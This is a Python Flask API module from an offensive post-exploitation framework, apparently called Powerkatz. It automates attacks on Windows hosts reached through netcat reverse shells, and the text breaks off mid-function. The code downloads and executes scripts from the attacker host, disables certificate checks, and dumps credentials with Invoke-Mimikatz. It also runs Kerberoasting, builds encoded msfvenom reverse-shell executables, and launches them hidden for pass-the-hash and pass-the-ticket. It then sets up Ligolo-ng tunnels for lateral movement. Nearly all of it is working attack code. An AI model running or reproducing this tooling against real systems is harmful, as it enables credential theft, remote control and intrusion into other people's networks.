from flask import Blueprint, request, jsonify, current_app, send_file
from re import findall, match, search
from base64 import b64decode
from io import BytesIO
from time import time
from random import choice
from uuid import uuid4
from os.path import join, dirname
import asyncio
import socket
import subprocess
import json
import ipaddress
import core.helper.pkinjector
import core.helper.pkexecutor
import core.helper.pkagent

DEFAULT_POWERKATZ_LISTENER_PORT_NUMBER = 7331
# common TCP ports from https://www.pearsonitcertification.com/articles/article.aspx?p=1868080
# HTTPS port 443 is omitted because this Flask web app is using it
COMMON_TCP_PORTS = (20, 21, 22, 23, 25, 53, 80, 110, 137, 138, 139, 143, 161, 162, 179, 389, 636, 989, 990)

api = Blueprint('api', __name__, url_prefix='/api')
mimikatzExecutor = core.helper.pkexecutor.MimikatzExecutor()
powerkatzAgent = core.helper.pkagent.PowerkatzAgent()

async def ignoreSSLCheck(processFd, pid):
    # from https://til.intrepidintegration.com/powershell/ssl-cert-bypass
    command = "Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy"
    await core.helper.pkinjector.injectStringsToProcess(processFd, pid, command)

async def forceLaunch64BitPowerShell(processFd, pid):
    # check the current terminal is cmd or not. If it is, force launch PowerShell
    # PowerShell will have syntax error in the below cmd/bat if statement
    command = '''IF '1' == '1' (powershell)'''
    await core.helper.pkinjector.injectStringsToProcess(processFd, pid, command)

    # check the PowerShell process is 64-bit or not. If not, force launch 64-bit PowerShell
    # from httpss://gist.github.com/talatham/ad406d5428ccec641f075a7019cd29a8
    command = "if (($pshome -like '*syswow64*') -and ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -like '64*')) { write-warning 'Restarting this shell with 64-bit PowerShell (Invoke-Mimikatz.ps1 requires 64-bit PowerShell)'; & (join-path ($pshome -replace 'syswow64', 'sysnative')\\\\powershell.exe)}"
    escapedCommandCharacterLength = 1
    await core.helper.pkinjector.injectStringsToProcess(processFd, pid, command, escapedCommandCharacterLength)

async def shellTargetServerPing(processFd, pid, attackerIpAddress):
    command = f"Invoke-WebRequest -UseBasicParsing -Uri https://{attackerIpAddress}/api/ping | Out-Null"
    await core.helper.pkinjector.injectStringsToProcess(processFd, pid, command)

async def powerShellListenerPing(remoteSocket, targetIpAddresses, targetPort):
    TIMEOUT_WINDOW = 10
    for targetIpAddress in targetIpAddresses:
        startTime = time()
        while time() - startTime < TIMEOUT_WINDOW:
            try:
                remoteSocket.connect((str(targetIpAddress.split(':')[0]), targetPort))
                pingMessage = 'ping'
                ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(pingMessage.encode())
                base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
                message = base64Ciphertext
                message += '\n'
                remoteSocket.sendall(message.encode())

                ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())
                decryptedOutput = current_app.config['AESEncryptorObject'].decryptAESCBC(ciphertext).strip()
                if decryptedOutput != 'pong':
                    return False

                return True
            except socket.error as error:
                if error.errno != socket.errno.ECONNREFUSED:
                    print(f'[ERROR] A socket error occurred in powerShellListenerPing(), error message: {error}')
                    return False

                # retry on error "[Errno 111] Connection refused"
                print('[INFO] Connection refused error occured. Retrying...')
                await asyncio.sleep(1)

    return False

def closeSocket(remoteSocket):
    try:
        remoteSocket.close()
        return True
    except:
        return False

async def startPowerShellListenerJob(processFd, pid, remoteSocket, targetIpAddress, powerkatzListenerPortNumber):
    command = "Start-Job -Name ServerListener -ScriptBlock { Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; } }'; [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy; Invoke-Expression $using:serverListenerString }"
    await core.helper.pkinjector.injectStringsToProcess(processFd, pid, command)

    isPowerkatzListenerAlive = await powerShellListenerPing(remoteSocket, [targetIpAddress], powerkatzListenerPortNumber)
    if not isPowerkatzListenerAlive:
        return False

    return True

async def removePowerShellListenerJob(targetIpAddress):
    command = 'Stop-Job -Name ServerListener; Remove-Job -Name ServerListener'
    await core.helper.pkinjector.injectStringsToProcess(current_app.config['settings']['generalSettings'][targetIpAddress]['processFd'], current_app.config['settings']['generalSettings'][targetIpAddress]['shellPid'], command)

def recvall(remoteSocket, length):
    data = b''
    while True:
        chunk = remoteSocket.recv(length)
        if len(chunk) < length:
            data += chunk
            break
        data += chunk
    return data

def checkIsRegistered():
    isRegistered = True if current_app.config['settings']['otherGeneralSettings']['isRegistered'] == True else False
    return isRegistered

def checkControllableShell(currentSession, shellType):
    isControllableShell = True if currentSession == 'shell' and shellType != 'other' else False
    isOtherShell = True if currentSession == 'shell' and shellType == 'other' else False

    return isControllableShell, isOtherShell

def getWordlistFullPath(filename):
    FALLBACK_WORDLIST_PATH = 'wordlist/xato-net-10-million-passwords-10000.txt'
    wordlistPath = ''
    getWordlistProcess = subprocess.Popen(['/usr/bin/locate', filename], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in getWordlistProcess.stdout:
        filePath = line.decode().strip()

        filename.replace('.', '\\.')
        matchedFile = match(r'.*{file}$'.format(file=filename), filePath)
        if matchedFile:
            wordlistPath = matchedFile.group(0)
            # we only need the first result
            break

    if not wordlistPath:
        wordlistPath = join(dirname(__file__), FALLBACK_WORDLIST_PATH)

    return wordlistPath

def getShellInformation(targetIpAddress, targetPortNumber, attackerIpAddress):
    isFailed = False
    messageOutput = str()
    shellInformation = dict()
    ssProcess = subprocess.Popen(f'ss -p | grep "ESTAB" | grep "{targetIpAddress}:" | grep "{targetPortNumber}"', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = ssProcess.communicate()

    if not output:
        isFailed = True
        messageOutput = f'Unable to find the shell\'s socket details. Maybe you typed an incorrect port number ({targetPortNumber})?'
        return isFailed, messageOutput, shellInformation

    socketDetails = output.decode().strip().split()
    socketLocalAddress = socketDetails[4].split(':')[0]
    socketPeerAddress = socketDetails[5].split(':')[0]

    isCorrectAttackerIpAddress = True if socketLocalAddress == attackerIpAddress else False
    isCorrectTargetIpAddress = True if socketPeerAddress == targetIpAddress else False
    if not isCorrectAttackerIpAddress:
        isFailed = True
        messageOutput = f'The shell\'s attacker IP address ({socketLocalAddress}) doesn\'t match the attacker IP address ({attackerIpAddress}) that you just typed.'
        return isFailed, messageOutput, shellInformation
    if not isCorrectTargetIpAddress:
        isFailed = True
        messageOutput = f'The shell\'s target IP address ({socketPeerAddress}) doesn\'t match the target IP address ({targetIpAddress}) that you just typed.'
        return isFailed, messageOutput, shellInformation

    processDescription = socketDetails[6].replace('users:', '').strip('()').split(',')
    processName = processDescription[0].replace('"', '')
    processId = processDescription[1].replace('pid=', '')
    processFd = processDescription[2].replace('fd=', '')
    controllableShellBinaryName = ['nc', 'netcat', 'socat']

    if processName not in controllableShellBinaryName:
        isFailed = True
        messageOutput = f'Unable to find the listener\'s binary name on port {targetPortNumber} (i.e.: nc, netcat, socat), thus it is NOT controllable. Please switch to the "Other" shell type option.'
        return isFailed, messageOutput, shellInformation

    shellInformation['shellPid'] = processId
    shellInformation['processFd'] = processFd
    return isFailed, messageOutput, shellInformation

def enumerateComputerDomain(targetIpAddresses):
    attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']
    for targetIpAddress in targetIpAddresses:
        command = f'IEX (New-Object System.Net.Webclient).DownloadString(\'https://{attackerIpAddress}/static/transferFiles/Enumerator.ps1\')'
        ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
        base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
        message = base64Ciphertext
        message += '\n'
        try:
            remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
            remoteSocket.sendall(message.encode())
            ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

            # decrypt the encrypted AES CBC message respond
            decryptedOutput = current_app.config['AESEncryptorObject'].decryptAESCBC(ciphertext).strip()

            jsonOutput = json.loads(decryptedOutput)
            current_app.config['settings']['targetComputer'][targetIpAddress] = jsonOutput['targetComputer']
            current_app.config['settings']['targetDomain'] = jsonOutput['targetDomain']
        except Exception as error:
            print(f'[ERROR] An error occurred in enumerateComputerDomain(), error message: {error}')
            return False

    return True

def executeCredentialDumping(targetIpAddresses):
    for targetIpAddress in targetIpAddresses:
        command = 'Invoke-Mimikatz -DumpCreds'
        ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
        base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
        message = base64Ciphertext
        message += '\n'
        try:
            remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
            remoteSocket.sendall(message.encode())
            ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

            # decrypt the encrypted AES CBC message respond
            decryptedOutput = current_app.config['AESEncryptorObject'].decryptAESCBC(ciphertext).strip()
            formattedResult = mimikatzExecutor.credentialDumping(decryptedOutput)

            formattedFunctionName = 'Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)'
            status = 'Succeed'
            current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, command, formattedResult)
        except Exception as error:
            print(f'[ERROR] An error occurred in executeCredentialDumping(), error message: {error}')
            return False

    return True

def executeKeberoasting():
    for domain in current_app.config['settings']['targetDomain']:
        kerberoastableServiceAccounts = current_app.config['settings']['targetDomain'][domain]['kerberoastableServiceAccounts']
        if not kerberoastableServiceAccounts:
            continue

        targetIpAddress = str()
        domainComputers = current_app.config['settings']['targetDomain'][domain]['computers']
        for computer in domainComputers:
            computerIpAddress = current_app.config['settings']['targetDomain'][domain]['computers'][computer]['ipAddress']
            if computerIpAddress in current_app.config['settings']['generalSettings']:
                targetIpAddress = computerIpAddress
                break

        if not targetIpAddress:
            continue

        command = 'Invoke-Mimikatz -Command \''
        for kerberoastableServiceAccount in kerberoastableServiceAccounts:
            # we're only getting the first SPN
            servicePrincipalName = kerberoastableServiceAccounts[kerberoastableServiceAccount]['servicePrincipalNames'][0]
            command += f'\"kerberos::ask /target:{servicePrincipalName}\" '
        command += '\"standard::base64 /out:true\" \"kerberos::list /export\"\''

        ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
        base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
        message = base64Ciphertext
        message += '\n'
        try:
            remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
            remoteSocket.sendall(message.encode())
            ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

            # decrypt the encrypted AES CBC message respond
            decryptedOutput = current_app.config['AESEncryptorObject'].decryptAESCBC(ciphertext).strip()
            formattedResult = mimikatzExecutor.kerberoasting(decryptedOutput)

            formattedFunctionName = 'Extract & Crack Service Accounts\' Password (Kerberoasting)'
            status = 'Succeed'
            current_app.config['powerkatzHistoryObject'].setIssuedCommands(formattedFunctionName, targetIpAddress, status, command, formattedResult)
        except Exception as error:
            print(f'[ERROR] An error occurred in executeKeberoasting(), error message: {error}')
            return False

    return True

def getFreeCommonTcpPorts():
    freeCommonTcpPorts = []
    for port in COMMON_TCP_PORTS:  
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('', port))
                freeCommonTcpPorts.append(port)
            except socket.error:
                pass
    return freeCommonTcpPorts

async def executeMimikatzPassTheHash(targetIpAddress, command, passTheHashUser):
    results = dict()
    results['isSuccessful'] = False
    results['messageOutput'] = str()
    results['newAgentId'] = str()
    newAgentId = str()

    if targetIpAddress not in current_app.config['settings']['generalSettings']:
        messageOutput = f'Target {targetIpAddress} doesn\'t have the Powerkatz Server Listener set up.'
        results['messageOutput'] = messageOutput
        return results
    
    freeCommonTcpPorts = getFreeCommonTcpPorts()
    if not freeCommonTcpPorts:
        messageOutput = 'Unable to find a free common TCP port to set up a netcat listener.'
        results['messageOutput'] = messageOutput
        return results

    randomFreeCommonTcpPort = choice(freeCommonTcpPorts)

    computerOsArchitechure = current_app.config['settings']['targetComputer'][targetIpAddress]['computerOsArchitechure']
    if computerOsArchitechure == 'Unknown':
        messageOutput = f'Unable to get the target\'s ({targetIpAddress}) OS architecture.'
        results['messageOutput'] = messageOutput
        return results

    randomUuidv4 = uuid4().hex
    randomPayloadExecutableFilename = f'{randomUuidv4}.exe'
    randomPayloadExecutablePath = f'./src/core/static/transferFiles/payloadExecutables/{randomPayloadExecutableFilename}'
    attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']
    if computerOsArchitechure == '64-bit':
        generateReverseShellPayloadCommand = f'msfvenom --arch x64 --platform windows --payload windows/x64/powershell_reverse_tcp LHOST={attackerIpAddress} LPORT={randomFreeCommonTcpPort} --encoder x64/xor_dynamic --iterations 10 --format exe --out {randomPayloadExecutablePath}'
    else:
        generateReverseShellPayloadCommand = f'msfvenom --arch x86 --platform windows --payload windows/powershell_reverse_tcp LHOST={attackerIpAddress} LPORT={randomFreeCommonTcpPort} --encoder x86/shikata_ga_nai --iterations 10 --format exe --out {randomPayloadExecutablePath}'

    newAgentId = powerkatzAgent.createNewAgent(passTheHashUser, targetIpAddress, payloadExecutableFilename=randomPayloadExecutableFilename)
    newAgent = powerkatzAgent.getAgentById(newAgentId)
    powerkatzAgent.startOutputReaderThread(newAgent)
    powerkatzAgent.executeCommandOnAgentProcess(newAgentId, generateReverseShellPayloadCommand)

    # wait for generating the executable
    retryCounter = 0
    isGenerated = False
    while not isGenerated:
        retryCounter += 1
        if retryCounter >= 10:
            break

        await asyncio.sleep(1)
        executedCommands = powerkatzAgent.getAgentExecutedCommands(newAgentId)
        if 'Saved as: ' in executedCommands:
            isGenerated = True
    if not isGenerated:
        messageOutput = f'Unable to generate the reverse shell executable.'
        results['messageOutput'] = messageOutput
        results['newAgentId'] = newAgentId
        return results

    netcatListenerCommand = f'nc -lnvp {randomFreeCommonTcpPort}'
    commandOutput = powerkatzAgent.executeCommandOnAgentProcess(newAgentId, netcatListenerCommand)

    transferPath = f'C:\\Windows\\Temp\\{randomPayloadExecutableFilename}'
    transferReverseShellPayloadExecutableCommand = f'Invoke-WebRequest -Uri https://{attackerIpAddress}/static/transferFiles/payloadExecutables/{randomPayloadExecutableFilename} -OutFile {transferPath}'
    ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(transferReverseShellPayloadExecutableCommand.encode())
    base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
    message = base64Ciphertext
    message += '\n'
    try:
        remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        remoteSocket.sendall(message.encode())
        ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())
    except Exception as error:
        print(f'[ERROR] An error occurred in executeMimikatzPassTheHash(), error message: {error}')
        messageOutput = f'Unable to transfer the generated reverse shell executable to the target computer ({targetIpAddress}).'
        results['messageOutput'] = messageOutput
        results['newAgentId'] = newAgentId
        return results

    # wait for transferring the executable
    await asyncio.sleep(2)

    newCommand = command.replace('<reverse_shell_executable>', transferPath)
    ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(newCommand.encode())
    base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
    message = base64Ciphertext
    message += '\n'
    try:
        remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        remoteSocket.sendall(message.encode())
        ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

        results['isSuccessful'] = True
        results['messageOutput'] = commandOutput
        results['newAgentId'] = newAgentId
    except Exception as error:
        print(f'[ERROR] An error occurred in executeMimikatzPassTheHash(), error message: {error}')
        messageOutput = f'Unable to execute Mimikatz (sekurlsa::pth) on the target computer ({targetIpAddress}).'
        results['messageOutput'] = messageOutput
        results['newAgentId'] = newAgentId

    # wait for the reverse shell connection
    await asyncio.sleep(2)

    powerkatzAgent.agentLoadMimikatz(newAgentId)

    return results

async def executePassTheTicket(targetIpAddress, tickets, formattedFunctionName):
    results = dict()

    # we'll just get the first ticket's username for creating new agent
    ticketUsername = tickets[0]['username']

    results['isSuccessful'] = False
    results['messageOutput'] = str()
    results['newAgentId'] = str()
    newAgentId = str()

    if targetIpAddress not in current_app.config['settings']['generalSettings']:
        messageOutput = f'Target {targetIpAddress} doesn\'t have the Powerkatz Server Listener set up.'
        results['messageOutput'] = messageOutput
        return results
    
    freeCommonTcpPorts = getFreeCommonTcpPorts()
    if not freeCommonTcpPorts:
        messageOutput = 'Unable to find a free common TCP port to set up a netcat listener.'
        results['messageOutput'] = messageOutput
        return results

    randomFreeCommonTcpPort = choice(freeCommonTcpPorts)

    computerOsArchitechure = current_app.config['settings']['targetComputer'][targetIpAddress]['computerOsArchitechure']
    if computerOsArchitechure == 'Unknown':
        messageOutput = f'Unable to get the target\'s ({targetIpAddress}) OS architecture.'
        results['messageOutput'] = messageOutput
        return results

    randomUuidv4 = uuid4().hex
    randomPayloadExecutableFilename = f'{randomUuidv4}.exe'
    randomPayloadExecutablePath = f'./src/core/static/transferFiles/payloadExecutables/{randomPayloadExecutableFilename}'
    attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']
    if computerOsArchitechure == '64-bit':
        generateReverseShellPayloadCommand = f'msfvenom --arch x64 --platform windows --payload windows/x64/powershell_reverse_tcp LHOST={attackerIpAddress} LPORT={randomFreeCommonTcpPort} --encoder x64/xor_dynamic --iterations 10 --format exe --out {randomPayloadExecutablePath}'
    else:
        generateReverseShellPayloadCommand = f'msfvenom --arch x86 --platform windows --payload windows/powershell_reverse_tcp LHOST={attackerIpAddress} LPORT={randomFreeCommonTcpPort} --encoder x86/shikata_ga_nai --iterations 10 --format exe --out {randomPayloadExecutablePath}'

    newAgentId = powerkatzAgent.createNewAgent(ticketUsername, targetIpAddress, payloadExecutableFilename=randomPayloadExecutableFilename)
    newAgent = powerkatzAgent.getAgentById(newAgentId)
    powerkatzAgent.startOutputReaderThread(newAgent)
    powerkatzAgent.executeCommandOnAgentProcess(newAgentId, generateReverseShellPayloadCommand)

    # wait for generating the executable
    retryCounter = 0
    isGenerated = False
    while not isGenerated:
        retryCounter += 1
        if retryCounter >= 10:
            break

        await asyncio.sleep(1)
        executedCommands = powerkatzAgent.getAgentExecutedCommands(newAgentId)
        if 'Saved as: ' in executedCommands:
            isGenerated = True
    if not isGenerated:
        messageOutput = f'Unable to generate the reverse shell executable.'
        results['messageOutput'] = messageOutput
        results['newAgentId'] = newAgentId
        return results

    netcatListenerCommand = f'nc -lnvp {randomFreeCommonTcpPort}'
    commandOutput = powerkatzAgent.executeCommandOnAgentProcess(newAgentId, netcatListenerCommand)

    transferPath = f'C:\\Windows\\Temp\\{randomPayloadExecutableFilename}'
    transferReverseShellPayloadExecutableCommand = f'Invoke-WebRequest -Uri https://{attackerIpAddress}/static/transferFiles/payloadExecutables/{randomPayloadExecutableFilename} -OutFile {transferPath}'
    ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(transferReverseShellPayloadExecutableCommand.encode())
    base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
    message = base64Ciphertext
    message += '\n'
    try:
        remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        remoteSocket.sendall(message.encode())
        ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())
    except Exception as error:
        print(f'[ERROR] An error occurred in executePassTheTicket(), error message: {error}')
        messageOutput = f'Unable to transfer the generated reverse shell executable to the target computer ({targetIpAddress}).'
        results['messageOutput'] = messageOutput
        results['newAgentId'] = newAgentId
        return results

    # wait for transferring the executable
    await asyncio.sleep(2)

    command = f'Start-Process -FilePath "{transferPath}" -WindowStyle Hidden'
    ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
    base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
    message = base64Ciphertext
    message += '\n'
    try:
        remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        remoteSocket.sendall(message.encode())
        ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

        results['isSuccessful'] = True
        results['messageOutput'] = commandOutput
        results['newAgentId'] = newAgentId
    except Exception as error:
        print(f'[ERROR] An error occurred in executePassTheTicket(), error message: {error}')
        messageOutput = f'Unable to execute {formattedFunctionName} on the target computer ({targetIpAddress}).'
        results['messageOutput'] = messageOutput
        results['newAgentId'] = newAgentId

    # wait for the reverse shell connection
    await asyncio.sleep(2)

    powerkatzAgent.agentLoadMimikatz(newAgentId)

    return results

async def addNewIpRouteToLigoloNgInterface():
    interfaces = current_app.config['settings']['otherGeneralSettings']['interfacesDetail']
    subnets = list()
    for domain in current_app.config['settings']['targetDomain']:
        domainNeworks = current_app.config['settings']['targetDomain'][domain]['networks']
        for subnetIpAddress in domainNeworks:
            subnetPrefix = current_app.config['settings']['targetDomain'][domain]['networks'][subnetIpAddress]['subnetPrefix']
            # check any duplicated interface subnet
            for interface in interfaces:
                interfaceNetwork = interfaces[interface]['network']
                isSameSubnet = ipaddress.ip_address(subnetIpAddress) in ipaddress.ip_network(interfaceNetwork)
                if not isSameSubnet:
                    subnets.append(f'{subnetIpAddress}/{subnetPrefix}')

    for subnet in subnets:
        command = ['/usr/bin/ip', 'route', 'add', subnet, 'dev', 'ligolo']
        subprocess.call(command)

async def addNewIpRouteToLigoloNgInterfaceFromImporting(settingsFileJson):
    interfaces = settingsFileJson['otherGeneralSettings']['interfacesDetail']
    subnets = list()
    for domain in settingsFileJson['targetDomain']:
        domainNeworks = settingsFileJson['targetDomain'][domain]['networks']
        for subnetIpAddress in domainNeworks:
            subnetPrefix = settingsFileJson['targetDomain'][domain]['networks'][subnetIpAddress]['subnetPrefix']
            # check any duplicated interface subnet
            for interface in interfaces:
                interfaceNetwork = interfaces[interface]['network']
                isSameSubnet = ipaddress.ip_address(subnetIpAddress) in ipaddress.ip_network(interfaceNetwork)
                if not isSameSubnet:
                    subnets.append(f'{subnetIpAddress}/{subnetPrefix}')

    for subnet in subnets:
        command = ['/usr/bin/ip', 'route', 'add', subnet, 'dev', 'ligolo']
        subprocess.call(command)

async def transferLigoloNgAgent():
    attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']
    targetIpAddress = str()
    result = dict()
    for targetIpAddress in current_app.config['settings']['generalSettings']:
        result[targetIpAddress] = dict()
        status = 'Succeed'
        try:
            computerOsArchitechure = current_app.config['settings']['targetComputer'][targetIpAddress]['computerOsArchitechure']
            if computerOsArchitechure == '64-bit':
                ligoloNgAgentFilename = 'ligolo-ng_agent_windows_amd64.exe'
            else:
                messageOutput = f'Currently, this feature only supports 64-bit.'
                status = 'Failed'
                break

            command = f'Invoke-WebRequest -Uri https://{attackerIpAddress}/static/transferFiles/ligolo-ng/{ligoloNgAgentFilename} -OutFile C:\\Windows\\Temp\\{ligoloNgAgentFilename}'
            ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
            base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
            message = base64Ciphertext
            message += '\n'

            remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
            remoteSocket.sendall(message.encode())
            ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

            messageOutput = 'Ligolo-ng agent has been transferred.'
        except Exception as error:
            print(f'[ERROR] An error occurred in transferLigoloNgAgent(), error message: {error}')
            messageOutput = f'Unable to transfer Ligolo-ng agent to the target computer {targetIpAddress}.'
            status = 'Failed'

        result[targetIpAddress]['status'] = status
        result[targetIpAddress]['messageOutput'] = messageOutput

    return result

async def transferLigoloNgAgentFromImporting(settingsFileJson):
    attackerIpAddress = settingsFileJson['otherGeneralSettings']['attackerIpAddress']
    targetIpAddress = str()
    result = dict()
    for targetIpAddress in settingsFileJson['generalSettings']:
        result[targetIpAddress] = dict()
        status = 'Succeed'
        try:
            computerOsArchitechure = settingsFileJson['targetComputer'][targetIpAddress]['computerOsArchitechure']
            if computerOsArchitechure == '64-bit':
                ligoloNgAgentFilename = 'ligolo-ng_agent_windows_amd64.exe'
            else:
                messageOutput = f'Currently, this feature only supports 64-bit.'
                status = 'Failed'
                break

            command = f'Invoke-WebRequest -Uri https://{attackerIpAddress}/static/transferFiles/ligolo-ng/{ligoloNgAgentFilename} -OutFile C:\\Windows\\Temp\\{ligoloNgAgentFilename}'
            ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
            base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
            message = base64Ciphertext
            message += '\n'
            
            remoteSocket = settingsFileJson['generalSettings'][targetIpAddress]['remoteSocket']
            remoteSocket.sendall(message.encode())
            ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

            messageOutput = 'Ligolo-ng agent has been transferred.'
        except Exception as error:
            print(f'[ERROR] An error occurred in transferLigoloNgAgent(), error message: {error}')
            messageOutput = f'Unable to transfer Ligolo-ng agent to the target computer {targetIpAddress}.'
            status = 'Failed'

        result[targetIpAddress]['status'] = status
        result[targetIpAddress]['messageOutput'] = messageOutput

    return result

async def setupTunneling(targetIpAddress, settingsFileJson=None):
    status = 'Succeed'
    if settingsFileJson:
        attackerIpAddress = settingsFileJson['otherGeneralSettings']['attackerIpAddress']
    else:
        attackerIpAddress = current_app.config['settings']['otherGeneralSettings']['attackerIpAddress']

    # TODO: generate random agent filename and change Ligolo-ng port
    ligoloNgAgentFilename = 'ligolo-ng_agent_windows_amd64.exe'
    ligoloNgProxyPort = '11601'
    try:
        command = f'Start-Job -Name LigoloNgAgent -ScriptBlock {{ C:\\Windows\\Temp\\{ligoloNgAgentFilename} -connect {attackerIpAddress}:{ligoloNgProxyPort} -ignore-cert }}'
        ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
        base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
        message = base64Ciphertext
        message += '\n'
        
        if settingsFileJson:
            remoteSocket = settingsFileJson['generalSettings'][targetIpAddress]['remoteSocket']
        else:
            remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
        remoteSocket.sendall(message.encode())

        # wait for connecting
        await asyncio.sleep(2)
        
        ciphertext = b64decode(recvall(remoteSocket, 4).strip().decode())

        output = powerkatzAgent.getTunnelingProxyExecutedCommands()
        if f'="{targetIpAddress}:' not in output:
            messageOutput = f'Target computer ({targetIpAddress}) unable to connect to the attacker\'s Ligolo-ng proxy.'
            status = 'Failed'
            return status, messageOutput

        tunnelingAgentId = powerkatzAgent.createNewProxyAgent(targetIpAddress)
        powerkatzAgent.startProxy(tunnelingAgentId)
    except Exception as error:
        print(f'[ERROR] An error occurred in setupTunneling(), error message: {error}')
        messageOutput = f'Target computer ({targetIpAddress}) unable to connect to the attacker\'s Ligolo-ng proxy.'
        status = 'Failed'

    if settingsFileJson is None:
        current_app.config['settings']['otherGeneralSettings']['tunnelingStatus'] = 'Up and running'

    messageOutput = 'Tunneling has been automatically set up.'
    return status, messageOutput

async def transferAndSetupTunneling():
    result = await transferLigoloNgAgent()
    for targetIpAddress in result:
        status = result[targetIpAddress]['status']
        messageOutput = result[targetIpAddress]['messageOutput']
        if status == 'Failed':
            return status, messageOutput

        await setupTunneling(targetIpAddress)

    return status, messageOutput

async def stopTunneling():
    powerkatzAgent.stopProxy()

@api.route('/sendMessage', methods=('POST',))
async def sendToListener(*args, **kwargs):
    jsonBody = request.json
    formattedFunctionName = jsonBody['formattedFunctionName']
    targetIpAddresses = jsonBody['targetIpAddresses']

    result = dict()

    isMimikatzCommand = True
    command = jsonBody['command']
    if formattedFunctionName == 'Password Hash Authentication (Pass-the-Hash)':
        isMimikatzCommand = False

    if isMimikatzCommand:
        for targetIpAddress in targetIpAddresses:
            result[targetIpAddress] = dict()
            try:
                status = 'Succeed'
                messageOutput = f'Attack function "{formattedFunctionName}" has been successfully executed on the target: {targetIpAddress}.'
                # encrypt the message using AES CBC mode
                ciphertext = current_app.config['AESEncryptorObject'].encryptAESCBC(command.encode())
                base64Ciphertext = current_app.config['AESEncryptorObject'].getBase64encryptedAESCBC(ciphertext)
                message = base64Ciphertext
                message += '\n'
                
                remoteSocket = current_app.config['settings']['generalSettings'][targetIpAddress]['remoteSocket']
                remoteSocket.sendall(message.encode())

                # it seems like the receive bytes number can't set too high, like 1024.
                # otherwise it won't receive all bytes
                RECEIVE_BYTES_NUMBER = 4
                receivedMessage = recvall(remoteSocket, RECEIVE_BYTES_NUMBER).strip().decode()
                ciphertext = b64decode(receivedMessage)

                # decrypt the encrypted AES CBC message respond
                decryptedResult = current_app.config['AESEncryptorObject'].decryptAESCBC(ciphertext)
                if formattedFunctionName == 'Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)':
                    formattedResult = mimikatzExecutor.credentialDumping(decryptedResult)
                elif formattedFunctionName == 'Extract & Crack Service Accounts\' Password (Kerberoasting)':
                    formattedResult = mimikatzExecutor.kerberoasting(decryptedResult)
                elif formattedFunctionName == 'Impersonate Service Accounts (Silver Ticket Attack)':
                    if '/ptt' in command:
